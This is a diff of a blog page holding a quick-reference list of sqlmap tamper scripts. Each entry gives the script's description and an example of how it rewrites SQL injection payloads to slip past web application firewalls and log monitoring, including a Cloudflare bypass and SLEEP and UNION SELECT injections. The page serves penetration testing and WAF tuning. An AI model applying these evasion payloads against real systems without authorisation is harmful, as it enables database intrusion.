@@ -245,7 +245,7 @@
 
     
         <meta property="article:published_time" content="Wed May 01 2019 16:44:36 GMT+0800">
-        <meta property="article:modified_time" content="Thu May 02 2019 00:38:06 GMT+0800">
+        <meta property="article:modified_time" content="Thu May 02 2019 00:41:46 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -268,7 +268,7 @@
     "mainEntityOfPage": "https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html",
     "headline": "sqlmap tamper规则速查",
     "datePublished": "Wed May 01 2019 16:44:36 GMT+0800",
-    "dateModified": "Thu May 02 2019 00:38:06 GMT+0800",
+    "dateModified": "Thu May 02 2019 00:41:46 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "AresX",
@@ -532,228 +532,172 @@
 <h3 id="0x2char-py"><a href="#0x2char-py" class="headerlink" title="0x2char.py:"></a>0x2char.py:</h3><pre><code>Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),...) counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT 0xdeadbeef&#39;)
     &#39;SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))&#39;
-
 </code></pre><h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h3><pre><code>Replaces apostrophe character (&#39;) with its UTF-8 full width counterpart (e.g. &#39; -&gt; %EF%BC%87)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
     &#39;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&#39;
-
 </code></pre><h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h3><pre><code>Replaces apostrophe character (&#39;) with its illegal double unicode counterpart (e.g. &#39; -&gt; %00%27)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
     &#39;1 AND %00%271%00%27=%00%271&#39;
-
 </code></pre><h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h3><pre><code>Appends (Access) NULL byte character (%00) at the end of payload
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 1=1&#39;)
     &#39;1 AND 1=1%00&#39;
-
 </code></pre><h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h3><pre><code>Base64-encodes all characters in a given payload
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)
     &#39;MScgQU5EIFNMRUVQKDUpIw==&#39;
-
 </code></pre><h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;NOT BETWEEN 0 AND #&#39; and equals operator (&#39;=&#39;) with &#39;BETWEEN # AND #&#39;
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B--&#39;)
     &#39;1 AND A NOT BETWEEN 0 AND B--&#39;
-
 &gt;&gt;&gt; tamper(&#39;1 AND A = B--&#39;)
     &#39;1 AND A BETWEEN B AND B--&#39;
-
 </code></pre><h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h3><pre><code>Replaces space character after SQL statement with a valid random blank character. Afterwards replace character &#39;=&#39; with operator LIKE
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users WHERE id = 1&#39;)
     &#39;SELECT%09id FROM%09users WHERE%09id LIKE 1&#39;
-
 </code></pre><h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h3><pre><code>Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %2553%2545%254C%2545%2543%2554)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)
     &#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;
-
 </code></pre><h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h3><pre><code>URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)
     &#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;
-
 </code></pre><h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py:"></a>charunicodeencode.py:</h3><pre><code>Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)
     &#39;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&#39;
-
 </code></pre><h3 id="charunicodeescape-py"><a href="#charunicodeescape-py" class="headerlink" title="charunicodeescape.py:"></a>charunicodeescape.py:</h3><pre><code>Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE&#39;)
     &#39;\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045&#39;
-
 </code></pre><h3 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py:"></a>commalesslimit.py:</h3><pre><code>Replaces (MySQL) instances like &#39;LIMIT M, N&#39; with &#39;LIMIT N OFFSET M&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;LIMIT 2, 3&#39;)
     &#39;LIMIT 3 OFFSET 2&#39;
-
 </code></pre><h3 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py:"></a>commalessmid.py:</h3><pre><code>Replaces (MySQL) instances like &#39;MID(A, B, C)&#39; with &#39;MID(A FROM B FOR C)&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;MID(VERSION(), 1, 1)&#39;)
     &#39;MID(VERSION() FROM 1 FOR 1)&#39;
-
 </code></pre><h3 id="commentbeforeparentheses-py"><a href="#commentbeforeparentheses-py" class="headerlink" title="commentbeforeparentheses.py:"></a>commentbeforeparentheses.py:</h3><pre><code>Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT ABS(1)&#39;)
     &#39;SELECT ABS/**/(1)&#39;
-
 </code></pre><h3 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py:"></a>concat2concatws.py:</h3><pre><code>Replaces (MySQL) instances like &#39;CONCAT(A, B)&#39; with &#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;CONCAT(1,2)&#39;)
     &#39;CONCAT_WS(MID(CHAR(0),0,0),1,2)&#39;
-
 </code></pre><h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py:"></a>equaltolike.py:</h3><pre><code>Replaces all occurrences of operator equal (&#39;=&#39;) with &#39;LIKE&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT * FROM users WHERE id=1&#39;)
     &#39;SELECT * FROM users WHERE id LIKE 1&#39;
-
 </code></pre><h3 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py:"></a>escapequotes.py:</h3><pre><code>Slash escape single and double quotes (e.g. &#39; -&gt; \&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1&quot; AND SLEEP(5)#&#39;)
     &#39;1\\\\&quot; AND SLEEP(5)#&#39;
-
 </code></pre><h3 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py:"></a>greatest.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;GREATEST&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B&#39;)
     &#39;1 AND GREATEST(A,B+1)=A&#39;
-
 </code></pre><h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py:"></a>halfversionedmorekeywords.py:</h3><pre><code>Adds (MySQL) versioned comment before each keyword
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;)
     &quot;value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa&quot;
-
 </code></pre><h3 id="htmlencode-py"><a href="#htmlencode-py" class="headerlink" title="htmlencode.py:"></a>htmlencode.py:</h3><pre><code>HTML encode (using code points) all non-alphanumeric characters (e.g. &#39; -&gt; &amp;#39;)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)
     &#39;1&amp;#39;&amp;#32;AND&amp;#32;SLEEP&amp;#40;5&amp;#41;&amp;#35;&#39;
-
 </code></pre><h3 id="ifnull2casewhenisnull-py"><a href="#ifnull2casewhenisnull-py" class="headerlink" title="ifnull2casewhenisnull.py:"></a>ifnull2casewhenisnull.py:</h3><pre><code>Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;CASE WHEN ISNULL(A) THEN (B) ELSE (A) END&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;IFNULL(1, 2)&#39;)
     &#39;CASE WHEN ISNULL(1) THEN (2) ELSE (1) END&#39;
-
 </code></pre><h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py:"></a>ifnull2ifisnull.py:</h3><pre><code>Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;IF(ISNULL(A), B, A)&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;IFNULL(1, 2)&#39;)
     &#39;IF(ISNULL(1),2,1)&#39;
-
 </code></pre><h3 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py:"></a>informationschemacomment.py:</h3><pre><code>Add an inline comment (/**/) to the end of all occurrences of (MySQL) &quot;information_schema&quot; identifier
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT table_name FROM INFORMATION_SCHEMA.TABLES&#39;)
     &#39;SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES&#39;
-
 </code></pre><h3 id="least-py"><a href="#least-py" class="headerlink" title="least.py:"></a>least.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;LEAST&#39; counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B&#39;)
     &#39;1 AND LEAST(A,B+1)=B+1&#39;
-
 </code></pre><h3 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py:"></a>lowercase.py:</h3><pre><code>Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;INSERT&#39;)
     &#39;insert&#39;
-
 </code></pre><h3 id="luanginx-py"><a href="#luanginx-py" class="headerlink" title="luanginx.py:"></a>luanginx.py:</h3><pre><code>LUA-Nginx WAFs Bypass (e.g. Cloudflare)
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0); hints={}; payload = tamper(&quot;1 AND 2&gt;1&quot;, hints=hints); &quot;%s&amp;%s&quot; % (hints[HINT.PREPEND], payload)
     &#39;0U=&amp;Aq=&amp;Fz=&amp;Ws=&amp;DK=&amp;4F=&amp;rU=&amp;Mp=&amp;48=&amp;Y3=&amp;tT=&amp;3Q=&amp;Dg=&amp;AL=&amp;47=&amp;D1=&amp;qX=&amp;Ia=&amp;Sy=&amp;ZP=&amp;aE=&amp;1p=&amp;u1=&amp;lJ=&amp;o7=&amp;XB=&amp;et=&amp;F5=&amp;gI=&amp;RH=&amp;YH=&amp;7L=&amp;KB=&amp;Kx=&amp;Js=&amp;lL=&amp;OD=&amp;fU=&amp;25=&amp;03=&amp;5H=&amp;yR=&amp;rY=&amp;03=&amp;K6=&amp;JB=&amp;O9=&amp;4X=&amp;fL=&amp;EN=&amp;0p=&amp;Th=&amp;nX=&amp;uY=&amp;gj=&amp;Rc=&amp;J4=&amp;HQ=&amp;bN=&amp;LJ=&amp;yw=&amp;8c=&amp;b7=&amp;lh=&amp;nX=&amp;6b=&amp;Ag=&amp;qn=&amp;Ov=&amp;lF=&amp;cg=&amp;9m=&amp;wT=&amp;Z4=&amp;kP=&amp;7d=&amp;P0=&amp;vp=&amp;LB=&amp;kD=&amp;zJ=&amp;Ft=&amp;wZ=&amp;pI=&amp;aT=&amp;uc=&amp;ro=&amp;7v=&amp;rw=&amp;6N=&amp;MS=&amp;yz=&amp;Oa=&amp;lu=&amp;oN=&amp;x2=&amp;Jz=&amp;yR=&amp;zP=&amp;cB=&amp;qj=&amp;GE=&amp;IU=&amp;2E=&amp;tC=&amp;Y2=&amp;Yl=&amp;9N=&amp;fS=&amp;9y=&amp;Qt=&amp;nS=&amp;aZ=&amp;Gg=&amp;hO=&amp;2r=&amp;8g=&amp;0y=&amp;fr=&amp;CX=&amp;1i=&amp;GO=&amp;v2=&amp;rb=&amp;cQ=&amp;I6=&amp;64=&amp;cU=&amp;RO=&amp;S3=&amp;Nx=&amp;Hm=&amp;Ka=&amp;ju=&amp;WS=&amp;uM=&amp;ck=&amp;8r=&amp;yI=&amp;sD=&amp;oc=&amp;lG=&amp;ey=&amp;uz=&amp;g4=&amp;D0=&amp;8v=&amp;DR=&amp;As=&amp;T3=&amp;5M=&amp;x8=&amp;Ne=&amp;fU=&amp;da=&amp;yG=&amp;BE=&amp;KQ=&amp;Aw=&amp;9q=&amp;WA=&amp;wd=&amp;1R=&amp;3B=&amp;Ph=&amp;ym=&amp;c6=&amp;nj=&amp;mx=&amp;Hj=&amp;98=&amp;jz=&amp;Q2=&amp;E4=&amp;tE=&amp;EP=&amp;mL=&amp;nv=&amp;73=&amp;Yc=&amp;jp=&amp;W0=&amp;KS=&amp;Ye=&amp;f1=&amp;cn=&amp;ca=&amp;0u=&amp;jO=&amp;8F=&amp;3F=&amp;JQ=&amp;XU=&amp;9U=&amp;4m=&amp;HL=&amp;ZD=&amp;Xy=&amp;K0=&amp;XO=&amp;al=&amp;Fp=&amp;e1=&amp;6s=&amp;zY=&amp;dN=&amp;hr=&amp;Zd=&amp;cz=&amp;E1=&amp;SP=&amp;j9=&amp;zL=&amp;xc=&amp;Dj=&amp;cM=&amp;Ng=&amp;Iv=&amp;xW=&amp;E2=&amp;LC=&amp;Nu=&amp;hQ=&amp;MW=&amp;h4=&amp;X4=&amp;2Q=&amp;YG=&amp;Wl=&amp;WB=&amp;UC=&amp;We=&amp;c5=&amp;E3=&amp;6P=&amp;Jn=&amp;fY=&amp;3W=&amp;RA=&amp;sh=&amp;AJ=&amp;56=&amp;zg=&amp;VT=&amp;bB=&amp;Qb=&amp;47=&amp;Se=&amp;ew=&amp;bv=&amp;a8=&amp;Ye=&amp;3m=&amp;mP=&amp;6h=&amp;aw=&amp;bL=&amp;1l=&amp;gv=&amp;7i=&amp;7w=&amp;Ds=&amp;67=&amp;Nl=&amp;9g=&amp;Kj=&amp;36=&amp;Xt=&amp;pU=&amp;sA=&amp;ci=&amp;be=&amp;eA=&amp;IT=&amp;iA=&amp;Nf=&amp;Bw=&amp;6d=&amp;zT=&amp;tm=&amp;sD=&amp;6X=&amp;rI=&amp;QX=&amp;By=&amp;VA=&amp;pC=&amp;6i=&amp;CN=&amp;Dm=&amp;aR=&amp;Ma=&amp;sV=&amp;MH=&amp;jR=&amp;DQ=&amp;Vo=&amp;Vr=&amp;9h=&amp;2c=&amp;pG=&amp;Ky=&amp;gp=&amp;rU=&amp;4K=&amp;cX=&amp;sv=&amp;Gp=&amp;5k=&amp;zr=&amp;GJ=&amp;MG=&amp;zN=&amp;zW=&amp;Ws=&amp;xM=&amp;jR=&amp;xK=&amp;iP=&amp;vD=&amp;zD=&amp;Rt=&amp;Od=&amp;sU=&amp;dM=&amp;bD=&amp;3a=&amp;Ge=&amp;1Q=&amp;UP=&amp;ac=&amp;M9=&amp;2R=&amp;To=&amp;Ur=&amp;gC=&amp;uk=&amp;A3=&amp;AB=&amp;RG=&amp;i4=&amp;BW=&amp;yY=&amp;yn=&amp;m6=&amp;Kd=&amp;yo=&amp;fl=&amp;dN=&amp;kL=&amp;LR=&amp;Fr=&amp;2v=&amp;CN=&amp;F7=&amp;75=&amp;5K=&amp;ER=&amp;nq=&amp;ck=&amp;aO=&amp;iW=&amp;Q8=&amp;y5=&amp;Cv=&amp;g2=&amp;Xu=&amp;Cu=&amp;bc=&amp;wm=&amp;Gl=&amp;mP=&amp;Tt=&amp;1p=&amp;vS=&amp;c5=&amp;eC=&amp;Sc=&amp;Y8=&amp;Ch=&amp;fg=&amp;Vz=&amp;4B=&amp;eA=&amp;UZ=&amp;cl=&amp;Eh=&amp;25=&amp;tA=&amp;Ir=&amp;Hm=&amp;sB=&amp;LH=&amp;qo=&amp;hW=&amp;gT=&amp;pr=&amp;TO=&amp;TF=&amp;1h=&amp;Oh=&amp;Tw=&amp;PR=&amp;On=&amp;Zo=&amp;GP=&amp;oM=&amp;rk=&amp;YI=&amp;uK=&amp;bi=&amp;y8=&amp;Fe=&amp;VW=&amp;WJ=&amp;Rn=&amp;TY=&amp;Vv=&amp;KM=&amp;3g=&amp;ZG=&amp;wC=&amp;an=&amp;OE=&amp;7D=&amp;t0=&amp;qL=&amp;RY=&amp;Wx=&amp;dc=&amp;T7=&amp;vB=&amp;SO=&amp;qP=&amp;sw=&amp;HT=&amp;jb=&amp;Mb=&amp;cn=&amp;Oe=&amp;d8=&amp;A3=&amp;nA=&amp;wk=&amp;u9=&amp;Ux=&amp;zq=&amp;GT=&amp;QC=&amp;c5=&amp;zy=&amp;ai=&amp;1F=&amp;Tj=&amp;u0=&amp;Yp=&amp;bY=&amp;kW=&amp;Qk=&amp;e5=&amp;LM=&amp;Cj=&amp;Lp=&amp;XT=&amp;b5=&amp;cf=&amp;sj=&amp;ow=&amp;Tz=&amp;qE=&amp;yt=&amp;3I=&amp;8V=&amp;Jq=&amp;QC=&amp;Sz=&amp;Eb=&amp;Tc=&amp;QK=&amp;Wr=&amp;Qm=&amp;Gv=&amp;8m=&amp;Ju=&amp;85=&amp;KS=&amp;Qv=&amp;43=&amp;uU=&amp;aY=&amp;J7=&amp;wM=&amp;uW=&amp;L9=&amp;ai=&amp;ch=&amp;56=&amp;D6=&amp;YW=&amp;Ul=&amp;1 AND 2&gt;1&#39;
-
 </code></pre><h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py:"></a>modsecurityversioned.py:</h3><pre><code>Embraces complete query with (MySQL) versioned comment
 </code></pre><pre><code>&gt;&gt;&gt; import random
     &gt;&gt;&gt; random.seed(0)
-
 &gt;&gt;&gt; tamper(&#39;1 AND 2&gt;1--&#39;)
     &#39;1 /*!30874AND 2&gt;1*/--&#39;
-
 </code></pre><h3 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py:"></a>modsecurityzeroversioned.py:</h3><pre><code>Embraces complete query with (MySQL) zero-versioned comment
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 2&gt;1--&#39;)
     &#39;1 /*!00000AND 2&gt;1*/--&#39;
-
 </code></pre><h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py:"></a>multiplespaces.py:</h3><pre><code>Adds multiple spaces (&#39; &#39;) around SQL keywords
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;1 UNION SELECT foobar&#39;)
-
 </code></pre><h3 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py:"></a>overlongutf8.py:</h3><pre><code>Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. &#39; -&gt; %C0%A7)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE WHERE 2&gt;1&#39;)
     &#39;SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1&#39;
-
 </code></pre><h3 id="overlongutf8more-py"><a href="#overlongutf8more-py" class="headerlink" title="overlongutf8more.py:"></a>overlongutf8more.py:</h3><pre><code>Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE WHERE 2&gt;1&#39;)
     &#39;%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1&#39;
-
 </code></pre><h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py:"></a>percentage.py:</h3><pre><code>Adds a percentage sign (&#39;%&#39;) infront of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE&#39;)
     &#39;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&#39;
-
 </code></pre><h3 id="plus2concat-py"><a href="#plus2concat-py" class="headerlink" title="plus2concat.py:"></a>plus2concat.py:</h3><pre><code>Replaces plus operator (&#39;+&#39;) with (MsSQL) function CONCAT() counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL&#39;)
     &#39;SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL&#39;
 
 &gt;&gt;&gt; tamper(&#39;SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL&#39;)
     &#39;SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL&#39;
-
 </code></pre><h3 id="plus2fnconcat-py"><a href="#plus2fnconcat-py" class="headerlink" title="plus2fnconcat.py:"></a>plus2fnconcat.py:</h3><pre><code>Replaces plus operator (&#39;+&#39;) with (MsSQL) ODBC function {fn CONCAT()} counterpart
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL&#39;)
     &#39;SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL&#39;
-
 &gt;&gt;&gt; tamper(&#39;SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL&#39;)
     &#39;SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL&#39;
-
 </code></pre><h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py:"></a>randomcase.py:</h3><pre><code>Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)
 </code></pre><pre><code>&gt;&gt;&gt; import random
 &gt;&gt;&gt; random.seed(0)
 &gt;&gt;&gt; tamper(&#39;INSERT&#39;)
     &#39;INseRt&#39;
-
 </code></pre><h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py:"></a>randomcomments.py:</h3><pre><code>Add random inline comments inside SQL keywords (e.g. SELECT -&gt; S/**/E/**/LECT)
 </code></pre><pre><code>&gt;&gt;&gt; import random
     &gt;&gt;&gt; random.seed(0)
-
 &gt;&gt;&gt; tamper(&#39;INSERT&#39;)
     &#39;I/**/N/**/SERT&#39;
-
 </code></pre><h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py:"></a>space2comment.py:</h3><pre><code>Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
     &#39;SELECT/**/id/**/FROM/**/users&#39;
-
 </code></pre><h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py:"></a>space2dash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a random string and a new line (&#39;\n&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
-
 </code></pre><h3 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py:"></a>space2hash.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
-
 </code></pre><h3 id="space2morecomment-py"><a href="#space2morecomment-py" class="headerlink" title="space2morecomment.py:"></a>space2morecomment.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with comments &#39;/**_**/&#39;
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
     &#39;SELECT/**_**/id/**_**/FROM/**_**/users&#39;
-
 </code></pre><h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py:"></a>space2morehash.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
-
 </code></pre><h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py:"></a>space2mssqlblank.py:</h3><pre><code>Replaces (MsSQL) instances of space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-
 </code></pre><h3 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py:"></a>space2mssqlhash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a new line (&#39;\n&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
     &#39;1%23%0AAND%23%0A9227=9227&#39;
-
 </code></pre><h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py:"></a>space2mysqlblank.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-
 </code></pre><h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py:"></a>space2mysqldash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a new line (&#39;\n&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
     &#39;1--%0AAND--%0A9227=9227&#39;
-
 </code></pre><h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py:"></a>space2plus.py:</h3><pre><code>Replaces space character (&#39; &#39;) with plus (&#39;+&#39;)
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
     &#39;SELECT+id+FROM+users&#39;
-
 </code></pre><h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py:"></a>space2randomblank.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
 </code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
     &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-
 </code></pre><h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py:"></a>sp_password.py:</h3><pre><code>Appends (MsSQL) function &#39;sp_password&#39; to the end of the payload for automatic obfuscation from DBMS logs
 </code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227-- &#39;)
